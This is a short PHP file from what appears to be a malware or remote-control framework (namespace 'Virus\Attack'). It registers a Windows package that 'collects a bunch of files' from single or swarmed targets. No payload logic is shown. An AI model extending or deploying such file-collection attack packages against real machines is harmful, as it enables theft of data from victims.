<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.CollectFile", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectFile\\CollectFile", "easy.CollectFile", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Collects a bunch of files");
